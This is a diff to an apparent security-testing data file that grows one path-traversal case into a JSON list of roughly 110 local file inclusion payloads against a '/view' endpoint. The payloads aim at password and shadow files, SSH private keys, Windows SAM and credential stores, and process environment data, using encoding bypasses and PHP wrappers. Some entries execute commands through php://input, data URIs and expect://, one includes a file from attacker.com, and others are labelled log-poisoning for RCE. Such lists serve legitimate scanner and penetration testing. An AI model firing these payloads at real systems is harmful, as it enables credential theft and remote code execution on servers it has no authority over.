@@ -1,6 +1,7 @@
-{
-    "name": "Local File Inclusion",
-    "description": "Attempt to read sensitive local file using path traversal",
+[
+  {
+    "name": "Basic Path Traversal",
+    "description": "Basic directory traversal using ../",
     "method": "GET",
     "endpoint": "/view",
     "headers": {
@@ -9,4 +10,1242 @@
     "parameters": {
       "file": "../../etc/passwd"
     }
+  },
+  {
+    "name": "Double URL Encoding",
+    "description": "Double URL encoded path traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+    }
+  },
+  {
+    "name": "UTF-8 Encoding",
+    "description": "UTF-8 encoded path traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+    }
+  },
+  {
+    "name": "Windows Path Traversal",
+    "description": "Windows style path traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "..\\..\\windows\\system.ini"
+    }
+  },
+  {
+    "name": "Null Byte Injection",
+    "description": "Null byte termination to bypass extensions",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/passwd%00"
+    }
+  },
+  {
+    "name": "Double Null Byte",
+    "description": "Double null byte injection",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/passwd%00%00"
+    }
+  },
+  {
+    "name": "Path Truncation",
+    "description": "Path truncation with long strings",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/passwdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    }
+  },
+  {
+    "name": "Absolute Path",
+    "description": "Absolute path inclusion",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "/etc/passwd"
+    }
+  },
+  {
+    "name": "PHP Wrapper Base64",
+    "description": "PHP filter wrapper with base64 encoding",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "php://filter/convert.base64-encode/resource=/etc/passwd"
+    }
+  },
+  {
+    "name": "PHP Wrapper Rot13",
+    "description": "PHP filter wrapper with rot13 encoding",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "php://filter/read=string.rot13/resource=/etc/passwd"
+    }
+  },
+  {
+    "name": "PHP Wrapper Chain",
+    "description": "Multiple PHP filters chained together",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd"
+    }
+  },
+  {
+    "name": "PHP Input Wrapper",
+    "description": "PHP input wrapper for code execution",
+    "method": "POST",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "file": "php://input"
+    },
+    "body": "<?php system('id'); ?>"
+  },
+  {
+    "name": "Data URI Scheme",
+    "description": "Data URI scheme for code execution",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
+    }
+  },
+  {
+    "name": "Expect Wrapper",
+    "description": "Expect wrapper for command execution",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "expect://id"
+    }
+  },
+  {
+    "name": "Zlib Wrapper",
+    "description": "Zlib compression wrapper",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "compress.zlib:///etc/passwd"
+    }
+  },
+  {
+    "name": "Bzip2 Wrapper",
+    "description": "Bzip2 compression wrapper",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "compress.bzip2:///etc/passwd"
+    }
+  },
+  {
+    "name": "Zip Wrapper",
+    "description": "Zip archive wrapper",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "zip:///tmp/evil.zip%23config.php"
+    }
+  },
+  {
+    "name": "Phar Wrapper",
+    "description": "Phar archive wrapper",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "phar:///tmp/evil.phar/config.php"
+    }
+  },
+  {
+    "name": "RFI to LFI",
+    "description": "Remote file inclusion to local file inclusion",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "http://attacker.com/evil.txt?../../etc/passwd"
+    }
+  },
+  {
+    "name": "Windows Hosts File",
+    "description": "Read Windows hosts file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../../../windows/system32/drivers/etc/hosts"
+    }
+  },
+  {
+    "name": "Windows SAM File",
+    "description": "Attempt to read Windows SAM file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../../../windows/repair/sam"
+    }
+  },
+  {
+    "name": "Apache Config",
+    "description": "Read Apache configuration",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/httpd/conf/httpd.conf"
+    }
+  },
+  {
+    "name": "Nginx Config",
+    "description": "Read Nginx configuration",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/nginx/nginx.conf"
+    }
+  },
+  {
+    "name": "MySQL Config",
+    "description": "Read MySQL configuration",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/my.cnf"
+    }
+  },
+  {
+    "name": "SSH Keys",
+    "description": "Read SSH private keys",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../.ssh/id_rsa"
+    }
+  },
+  {
+    "name": "SSH Config",
+    "description": "Read SSH configuration",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../.ssh/config"
+    }
+  },
+  {
+    "name": "Bash History",
+    "description": "Read bash history",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../.bash_history"
+    }
+  },
+  {
+    "name": "PHP Session Files",
+    "description": "Read PHP session files",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../tmp/sess_12345"
+    }
+  },
+  {
+    "name": "PHP Info File",
+    "description": "Read PHP info file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../phpinfo.php"
+    }
+  },
+  {
+    "name": "Web Server Logs",
+    "description": "Read web server access logs",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../var/log/apache2/access.log"
+    }
+  },
+  {
+    "name": "Error Logs",
+    "description": "Read error logs",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../var/log/apache2/error.log"
+    }
+  },
+  {
+    "name": "Linux Shadow File",
+    "description": "Read Linux shadow file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/shadow"
+    }
+  },
+  {
+    "name": "Linux Group File",
+    "description": "Read Linux group file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/group"
+    }
+  },
+  {
+    "name": "Linux Hosts File",
+    "description": "Read Linux hosts file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/hosts"
+    }
+  },
+  {
+    "name": "Linux Services File",
+    "description": "Read Linux services file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/services"
+    }
+  },
+  {
+    "name": "Linux Protocols File",
+    "description": "Read Linux protocols file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/protocols"
+    }
+  },
+  {
+    "name": "Linux Resolv Conf",
+    "description": "Read DNS resolution config",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/resolv.conf"
+    }
+  },
+  {
+    "name": "Linux Issue File",
+    "description": "Read Linux issue file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/issue"
+    }
+  },
+  {
+    "name": "Linux Issue.net",
+    "description": "Read Linux issue.net file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/issue.net"
+    }
+  },
+  {
+    "name": "Linux Motd",
+    "description": "Read message of the day",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/motd"
+    }
+  },
+  {
+    "name": "Linux Fstab",
+    "description": "Read filesystem table",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/fstab"
+    }
+  },
+  {
+    "name": "Linux Crontab",
+    "description": "Read system crontab",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/crontab"
+    }
+  },
+  {
+    "name": "Linux Cron Directory",
+    "description": "Read cron directory files",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/cron.daily/backup"
+    }
+  },
+  {
+    "name": "Linux Sudoers File",
+    "description": "Read sudoers file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/sudoers"
+    }
+  },
+  {
+    "name": "Linux Profile",
+    "description": "Read system profile",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/profile"
+    }
+  },
+  {
+    "name": "Linux Bashrc",
+    "description": "Read system bashrc",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/bash.bashrc"
+    }
+  },
+  {
+    "name": "Linux Environment",
+    "description": "Read environment file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/environment"
+    }
+  },
+  {
+    "name": "Linux Timezone",
+    "description": "Read timezone file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/timezone"
+    }
+  },
+  {
+    "name": "Linux Localtime",
+    "description": "Read localtime file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../etc/localtime"
+    }
+  },
+  {
+    "name": "Linux Passwd with Filter",
+    "description": "Read passwd with PHP filter",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "php://filter/convert.base64-encode/resource=../../etc/passwd"
+    }
+  },
+  {
+    "name": "Linux Shadow with Filter",
+    "description": "Read shadow with PHP filter",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "php://filter/convert.base64-encode/resource=../../etc/shadow"
+    }
+  },
+  {
+    "name": "Double Traversal",
+    "description": "Extra long path traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../../../../../../../../../etc/passwd"
+    }
+  },
+  {
+    "name": "Mixed Slashes",
+    "description": "Mixed forward and backslashes",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "..\\../..\\../etc/passwd"
+    }
+  },
+  {
+    "name": "URL Encoded Traversal",
+    "description": "URL encoded path traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "..%2f..%2fetc%2fpasswd"
+    }
+  },
+  {
+    "name": "Double URL Encoded",
+    "description": "Double URL encoded traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+    }
+  },
+  {
+    "name": "Unicode Encoding",
+    "description": "Unicode encoded traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd"
+    }
+  },
+  {
+    "name": "UTF-16 Encoding",
+    "description": "UTF-16 encoded traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "%fe%ff%00.%00.%00/%00.%00.%00/%00e%00t%00c%00/%00p%00a%00s%00s%00w%00d"
+    }
+  },
+  {
+    "name": "UTF-32 Encoding",
+    "description": "UTF-32 encoded traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "%00%00%fe%ff%00%00%00.%00%00%00.%00%00%00/%00%00%00.%00%00%00.%00%00%00/%00%00%00e%00%00%00t%00%00%00c%00%00%00/%00%00%00p%00%00%00a%00%00%00s%00%00%00s%00%00%00w%00%00%00d"
+    }
+  },
+  {
+    "name": "HTML Entity Encoding",
+    "description": "HTML entity encoded traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "..&#47;..&#47;etc&#47;passwd"
+    }
+  },
+  {
+    "name": "Hex Encoding",
+    "description": "Hex encoded traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "..%5c..%5cetc%5cpasswd"
+    }
+  },
+  {
+    "name": "Octal Encoding",
+    "description": "Octal encoded traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "..\\056\\056\\057..\\056\\056\\057etc\\057passwd"
+    }
+  },
+  {
+    "name": "Base64 Encoding",
+    "description": "Base64 encoded traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "Li4vLi4vZXRjL3Bhc3N3ZA=="
+    }
+  },
+  {
+    "name": "Rot13 Encoding",
+    "description": "Rot13 encoded traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "..//..//rpg//cnffjq"
+    }
+  },
+  {
+    "name": "XOR Encoding",
+    "description": "XOR encoded traversal",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "PPMPPMPTTQMPTTQMPdqpMpcuuwr"
+    }
+  },
+  {
+    "name": "Windows Registry",
+    "description": "Read Windows registry files",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../windows/system32/config/SAM"
+    }
+  },
+  {
+    "name": "Windows System32",
+    "description": "Read Windows system32 files",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../windows/system32/cmd.exe"
+    }
+  },
+  {
+    "name": "Windows Boot ini",
+    "description": "Read Windows boot.ini",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../boot.ini"
+    }
+  },
+  {
+    "name": "Windows Autoexec",
+    "description": "Read Windows autoexec.bat",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../autoexec.bat"
+    }
+  },
+  {
+    "name": "Windows Config",
+    "description": "Read Windows config.sys",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../config.sys"
+    }
+  },
+  {
+    "name": "Windows Profile",
+    "description": "Read Windows user profile",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../Documents and Settings/Administrator/NTUSER.DAT"
+    }
+  },
+  {
+    "name": "Windows Recycler",
+    "description": "Read Windows recycler info",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../RECYCLER/S-1-5-21-*/*.txt"
+    }
+  },
+  {
+    "name": "Windows Pagefile",
+    "description": "Attempt to read pagefile",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../pagefile.sys"
+    }
+  },
+  {
+    "name": "Windows Hiberfil",
+    "description": "Attempt to read hibernation file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../hiberfil.sys"
+    }
+  },
+  {
+    "name": "Windows Swapfile",
+    "description": "Attempt to read swap file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../swapfile.sys"
+    }
+  },
+  {
+    "name": "Windows Temp Files",
+    "description": "Read Windows temp files",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../windows/temp/log.txt"
+    }
+  },
+  {
+    "name": "Windows Install Logs",
+    "description": "Read Windows installation logs",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../windows/setupapi.log"
+    }
+  },
+  {
+    "name": "Windows Event Logs",
+    "description": "Read Windows event logs",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../windows/system32/winevt/logs/Application.evtx"
+    }
+  },
+  {
+    "name": "Windows IIS Logs",
+    "description": "Read IIS logs",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../inetpub/logs/LogFiles/W3SVC1/*.log"
+    }
+  },
+  {
+    "name": "Windows Web Config",
+    "description": "Read web.config file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../web.config"
+    }
+  },
+  {
+    "name": "Windows Machine Config",
+    "description": "Read machine.config file",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../windows/microsoft.net/framework/*/config/machine.config"
+    }
+  },
+  {
+    "name": "Windows DPAPI",
+    "description": "Read DPAPI files",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../AppData/Roaming/Microsoft/Protect/*/*"
+    }
+  },
+  {
+    "name": "Windows Credentials",
+    "description": "Read credential files",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../AppData/Local/Microsoft/Credentials/*"
+    }
+  },
+  {
+    "name": "Windows Vault",
+    "description": "Read vault files",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../AppData/Local/Microsoft/Vault/*"
+    }
+  },
+  {
+    "name": "Windows LSA Secrets",
+    "description": "Attempt to read LSA secrets",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../windows/system32/config/SECURITY"
+    }
+  },
+  {
+    "name": "Windows SAM with Filter",
+    "description": "Read SAM with PHP filter",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "php://filter/convert.base64-encode/resource=../../windows/system32/config/SAM"
+    }
+  },
+  {
+    "name": "Windows SYSTEM with Filter",
+    "description": "Read SYSTEM with PHP filter",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "php://filter/convert.base64-encode/resource=../../windows/system32/config/SYSTEM"
+    }
+  },
+  {
+    "name": "Windows SECURITY with Filter",
+    "description": "Read SECURITY with PHP filter",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "php://filter/convert.base64-encode/resource=../../windows/system32/config/SECURITY"
+    }
+  },
+  {
+    "name": "Log Poisoning Access Log",
+    "description": "Poison access logs for RCE",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../var/log/apache2/access.log"
+    }
+  },
+  {
+    "name": "Log Poisoning Error Log",
+    "description": "Poison error logs for RCE",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../var/log/apache2/error.log"
+    }
+  },
+  {
+    "name": "Log Poisoning Auth Log",
+    "description": "Poison auth logs for RCE",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../var/log/auth.log"
+    }
+  },
+  {
+    "name": "Log Poisoning SSH Log",
+    "description": "Poison SSH logs for RCE",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../var/log/secure"
+    }
+  },
+  {
+    "name": "Log Poisoning Mail Log",
+    "description": "Poison mail logs for RCE",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../var/log/mail.log"
+    }
+  },
+  {
+    "name": "Log Poisoning FTP Log",
+    "description": "Poison FTP logs for RCE",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../var/log/vsftpd.log"
+    }
+  },
+  {
+    "name": "Log Poisoning with Filter",
+    "description": "Poison logs with PHP filter",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "php://filter/convert.base64-encode/resource=../../var/log/apache2/access.log"
+    }
+  },
+  {
+    "name": "PHP Session Poisoning",
+    "description": "Poison PHP sessions for RCE",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "../../tmp/sess_12345"
+    }
+  },
+  {
+    "name": "PHP Session with Filter",
+    "description": "Read PHP sessions with filter",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "php://filter/convert.base64-encode/resource=../../tmp/sess_12345"
+    }
+  },
+  {
+    "name": "Environment Variables",
+    "description": "Read environment variables",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "/proc/self/environ"
+    }
+  },
+  {
+    "name": "Process Maps",
+    "description": "Read process memory maps",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "/proc/self/maps"
+    }
+  },
+  {
+    "name": "Process Status",
+    "description": "Read process status",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "/proc/self/status"
+    }
+  },
+  {
+    "name": "Process Cmdline",
+    "description": "Read process command line",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "/proc/self/cmdline"
+    }
+  },
+  {
+    "name": "Process FD",
+    "description": "Read process file descriptors",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "/proc/self/fd/0"
+    }
+  },
+  {
+    "name": "CPU Info",
+    "description": "Read CPU information",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "/proc/cpuinfo"
+    }
+  },
+  {
+    "name": "Memory Info",
+    "description": "Read memory information",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "/proc/meminfo"
+    }
+  },
+  {
+    "name": "Version Info",
+    "description": "Read version information",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "/proc/version"
+    }
   }
+]
